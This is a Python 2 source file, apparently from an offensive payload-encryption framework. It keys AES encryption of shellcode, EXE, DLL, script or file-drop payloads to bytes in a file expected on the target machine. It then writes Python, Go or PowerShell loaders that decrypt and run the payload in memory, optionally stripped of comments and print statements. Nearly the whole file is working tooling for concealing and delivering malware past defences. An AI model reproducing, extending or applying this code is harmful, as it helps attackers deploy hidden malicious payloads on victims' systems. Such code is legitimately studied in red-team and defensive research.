import hashlib
import sys
import re
import struct
import zlib
import base64
import random
import textwrap
import os
import platform
from Crypto.Cipher import AES
from Crypto import Random
import StringIO
import binascii

from templates.python import otp_symmetric_base
from templates.python.payloads import pe_exe
from templates.python.payloads import win_shellcode
from templates.python.payloads import code
from templates.python.payloads import drop_file
from templates.go import go_otp_symmetric_base
from templates.go.payloads import go_win_shellcode
from templates.go.payloads import go_memorymodule
from templates.powershell import ps_otp_symmetric_base
from templates.powershell.payloads import ps_code
from templates.powershell.payloads import ps_drop_file
from templates.powershell.payloads import ps_dll_exe
from templates.powershell.payloads import ps_win_shellcode
from cleanup import removeCommentsGo
from cleanup import removeCommentsPy


class otp_key:

    def __init__(self, pad, payload, otp_type, payload_type, minus_bytes, scan_dir, output_type, key_iterations, pad_max, cleanup=False):
        self.org_payload = payload
        self.payload = open(payload, 'rb').read()
        print "[*] Payload length", hex(len(self.payload))
        self.lookup_table = ''
        self.otp_type = otp_type
        self.payload_type = payload_type
        self.minus_bytes = int(minus_bytes)
        self.key_iterations = int(key_iterations)
        self.output_type = output_type
        self.scan_dir = scan_dir
        self.payload_loader = ''
        self.payload_imports = ''
        self.pad = pad
        self.cleanup = cleanup
        self.set_payload()
        self.pad_max = pad_max
        self.file_suffix = ''

        if output_type in ['python', 'both']:
            if 'dll' in self.payload_type.lower():
                print "[X] No DLL Support for python"
                sys.exit(-1)
        print "[*] Using the following as an OTP:", self.pad
        if self.pad_max.startswith("0x"):
            self.pad_max = int(self.pad_max, 16)
        if self.pad_max > 256 ** 3 - 1:
            print "[!] That's too big of a pad or you don't speak hex or int"
            self.pad_max = 256 ** 3 -1
        print "[*] Using a maximum pad size of:", hex(self.pad_max)
        self.hash_payload()
        self.find_key_encrypt()
        if self.output_type == 'python':
            if 'dll' in self.payload_type.lower():
                print "[X] No DLL Support for python"
                sys.exit(-1)
            self.gen_pyloader()
        elif self.output_type == 'go':
            self.gen_goloader()
        elif self.output_type == 'powershell':
            self.gen_psloader()

    def set_payload(self):
        print "[*] Payload_type", self.payload_type
        if self.payload_type == "shellcode":
            print '[*] Using shellcode payload template' 
            self.payload_loader = win_shellcode.loader
            self.go_payload_loader = go_win_shellcode.loader
            self.payload_imports = go_win_shellcode.imports
            self.ps_payload_loader = ps_win_shellcode.loader

        elif self.payload_type == "exe":
            print '[*] Using EXE payload template' 
            self.payload_loader = pe_exe.loader
            self.go_payload_loader = go_memorymodule.loader
            self.payload_imports = go_memorymodule.imports
            self.ps_payload_loader = ps_dll_exe.loader

        elif self.payload_type == "dll_x86":
            # go memory module
            print '[*] Using x86 dll payload template' 
            #self.payload_loader = pe_dll_x86.loader
            self.go_payload_loader = go_memorymodule.loader
            self.payload_imports = go_memorymodule.imports
            self.ps_payload_loader = ps_dll_exe.loader
            
        elif self.payload_type == "dll_x64":
            #self.payload_loader = pe_dll_x64.loader
            # go memory module
            self.go_payload_loader = go_memorymodule.loader
            self.payload_imports = go_memorymodule.imports
            self.ps_payload_loader = ps_dll_exe.loader
            
        elif self.payload_type == "code": # python code
            # python only
            self.payload_loader = code.loader
            self.ps_payload_loader = ps_code.loader

        elif self.payload_type == "file_drop":
            if len(os.path.basename(self.org_payload).split('.')) > 2:
                file_suffix = '.' + '.'.join(os.path.basename(self.org_payload).split('.')[1:])
            else:
                filename, file_suffix = os.path.splitext(self.org_payload)

            self.file_suffix = file_suffix
            self.payload_loader = drop_file.loader.format(self.file_suffix)
            self.ps_payload_loader = drop_file.loader.format(self.file_suffix)
            #self.go_payload_loader = go_drop_file.loader

    def hash_payload(self):
        # This is the final hash ADD THE self.payload - minus function
        self.payload_hash = hashlib.sha512(self.payload[:-self.minus_bytes]).hexdigest()

    def pkcs7_encode(self, some_string):
        '''
        Pad an input string according to PKCS#7
        '''
        block = 16
        text_length = len(some_string)
        output = StringIO.StringIO()
        val = block - (text_length % block)
        for _ in xrange(val):
            output.write('%02x' % val)
        return some_string + binascii.unhexlify(output.getvalue())
    
    def find_key_encrypt(self):
        self.location = 0
        self.sizeofPad = len(open(self.pad, 'r').read(self.pad_max))

        self.key_len = random.randint(32, 256)
        print '[*] Randomly chosen key source length between 32 and 256:', self.key_len
        
        with open(self.pad, 'r') as f:
            while True:
                f.seek(0)
                f.seek(random.randint(0, self.sizeofPad), 0)
                self.location = f.tell()
                if self.location + self.key_len >= self.sizeofPad:
                    print "[!] File location for key too close to end of file, re-trying key"
                else:
                    break

            f.seek(0)
            f.seek(self.location, 0)
            self.key = f.read(self.key_len)
    
        print '[*] Location of key in file', hex(self.location)

        # Do a sha512 has of the key and trim the front 32 bytes (256 bits)
        #self.key = self.key_line
        key_iterations = self.key_iterations
        
        print "[*] Applying %s sha512 hash iterations before encryption" % key_iterations

        while key_iterations > 1:
            
            self.key = hashlib.sha512(self.key).digest()
            key_iterations -= 1
            #print self.key.encode('hex')

        self.key = hashlib.sha512(self.key).digest()[:32]
        
        print '[*] Encryption Key:', self.key.encode('hex'), base64.b64encode(self.key)
        
        self.iv = Random.new().read(AES.block_size)
        
        # Using CFB because we don't have to break it up by blocks or use padding
        if self.output_type == 'python':
            cipher = AES.new(self.key, AES.MODE_CFB, self.iv)
            
            self.encrypted_msg = cipher.encrypt(self.payload)
            print '[*] Length of encrypted payload', len(self.encrypted_msg), 'and hash:', hashlib.sha512(self.encrypted_msg).hexdigest()
            self.lookup_table = zlib.compress(struct.pack("<I", self.location) + struct.pack("<H", self.key_len) + self.iv + self.encrypted_msg)

            # Encrypt payload payload
            self.payload_loader = base64.b64encode(zlib.compress(cipher.encrypt(self.payload_loader)))
        
        # Gen go formated AES cipher
        
        elif self.output_type.lower() == 'go':
            print "[*] Generating encrypted payload for the GO output (padding is different than python)"
            go_block_size = 128

            gocipher = AES.new(
                self.key, 
                AES.MODE_CFB, 
                self.iv,
                # DAMN YOU PYTHON and CFB8
                segment_size=go_block_size
            )

            PADDING="{"
            # Normally you don't have to pad CFB, but go is CFB128 -- python is CFB8
            print "\t[*] Length before padding and encoding:", len(self.payload)
            self.base64_encoded_payload = base64.b64encode(self.payload)
            print "\t[*] Length after encoding:", len(self.base64_encoded_payload)
            self.payload = self.base64_encoded_payload + (go_block_size - len(self.base64_encoded_payload) % go_block_size) * PADDING
            print "\t[*] Length after padding:", len(self.payload)
            self.go_encrypted_msg = gocipher.encrypt(self.payload)
            self.go_lookup_table = zlib.compress(struct.pack("<I", self.location) + struct.pack("<H", self.key_len) + self.iv + self.go_encrypted_msg)

        elif self.output_type == 'powershell':
            print "in powershell"
            ps_block_size = 128
            pscipher = AES.new(self.key,
                               AES.MODE_CBC,
                               self.iv,
                               segment_size = ps_block_size,
                            )
            self.b64_encoded_payload = base64.b64encode(self.payload)
            
            self.ps_encrypted_msg = pscipher.encrypt(self.pkcs7_encode(self.payload))
            
            self.ps_lookup_table = base64.b64encode(struct.pack("<I", self.location) + struct.pack("<H", self.key_len) + base64.b64encode(self.iv + self.ps_encrypted_msg))
            
            # Must refresh
            self.iv = Random.new().read(AES.block_size)
            pscipher = AES.new(self.key,
                               AES.MODE_CBC,
                               self.iv,
                               segment_size = ps_block_size,
                )

            self.encrypted_loader = pscipher.encrypt(self.pkcs7_encode(self.ps_payload_loader))
            
            self.ps_payload_loader = base64.b64encode(self.iv + self.encrypted_loader)

    def write_payload(self):
        if not os.path.exists('./output'):
            os.makedirs('./output')
        
        with open(r'./output/' + self.payload_name, 'w') as f:
            if "go_" in self.payload_name and self.cleanup:
                print "[*] Removing Comments and Print Statements"
                self.payload_output = removeCommentsGo(self.payload_output,removePrint=True)
            elif "python_" in self.payload_name and self.cleanup:
                print "[*] Removing Comments and Print Statements"
                self.payload_output = removeCommentsPy(self.payload_output,removePrint=True)
            elif self.payload_name and self.cleanup:
                print "[!] Error Selecting Type of File for Cleaning : %s" % (self.payload_name)
            f.write(self.payload_output)


    def gen_pyloader(self):
        self.payload_name = 'python_otp_key_' + os.path.basename(self.org_payload) + ".py"
        print '[*] Payload hash (minus_bytes):', self.payload_hash
        print '[*] Hash of full payload:', hashlib.sha512(self.payload).hexdigest()
        print "[*] Writing Python payload to:", self.payload_name
        
        self.payload_output = otp_symmetric_base.buildcode.format(base64.b64encode(self.lookup_table), self.payload_hash, 
                                                             self.minus_bytes, self.payload_loader, 
                                                             self.scan_dir, self.key_iterations)
        self.write_payload()

    def gen_goloader(self):
        self.import_set = set(["bytes",
                               "os",        # needed for memory module
                               "unsafe",    # needed for memory module
                               "io",
                               "fmt",
                               "strings",
                               "runtime",
                               "path/filepath",
                               "encoding/hex",
                               "compress/zlib",
                               "crypto/sha512",
                               "encoding/base64",
                               "encoding/binary",
                               "crypto/aes",
                               "crypto/cipher"])

        # add any paylaod_imports 
        if self.payload_imports != '':
            for item in self.payload_imports: self.import_set.add(item)

        self.payload_name = "go_otp_key_" + os.path.basename(self.org_payload) + ".go"
        print '[*] Payload hash (minus_bytes):', self.payload_hash
        print '[*] Hash of full payload:', hashlib.sha512(self.payload).hexdigest()
        print '[*] Writing GO payload to:', self.payload_name
        
        go_imports = ''

        for item in self.import_set:         
            go_imports += "\"" + item + "\"\n\t"

        self.payload_output = go_otp_symmetric_base.buildcode.format(base64.b64encode(self.go_lookup_table), self.payload_hash, 
                                                             self.minus_bytes, self.go_payload_loader, 
                                                             self.scan_dir, go_imports, self.key_iterations)
        self.write_payload()

    def gen_psloader(self):
        self.payload_name = 'powershell_otp_key_' + os.path.basename(self.org_payload) + ".ps1"
        print '[*] Payload hash (minus_bytes):', self.payload_hash
        print '[*] Hash of full payload:', hashlib.sha512(self.payload).hexdigest()
        print "[*] Writing PowerShell payload to:", self.payload_name
        
        self.payload_output = ps_otp_symmetric_base.buildcode.format(self.ps_lookup_table, self.payload_hash, 
                                                             self.minus_bytes, self.ps_payload_loader, 
                                                             self.scan_dir, self.key_iterations)
        self.write_payload()

